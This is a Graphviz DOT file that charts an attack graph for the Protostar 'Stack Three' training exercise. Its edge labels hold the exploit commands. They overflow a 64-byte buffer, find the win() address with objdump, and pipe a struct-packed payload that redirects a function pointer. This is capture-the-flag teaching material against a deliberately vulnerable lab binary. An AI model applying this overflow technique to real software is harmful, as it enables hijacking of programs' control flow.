digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Protostar Stack Three"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Offset to function pointer identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="win() address recovered"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Exploit payload built"];
  node3 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Function pointer redirected to win()"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'print \"A\"*64 + \"BBBB\"' | /opt/protostar/bin/stack3"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -t /opt/protostar/bin/stack3 | grep \" win\""];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'import struct; print \"A\"*64 + struct.pack(\"<I\", 0x08048424)'"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'import struct; print \"A\"*64 + struct.pack(\"<I\", 0x08048424)' | /opt/protostar/bin/stack3"];
}
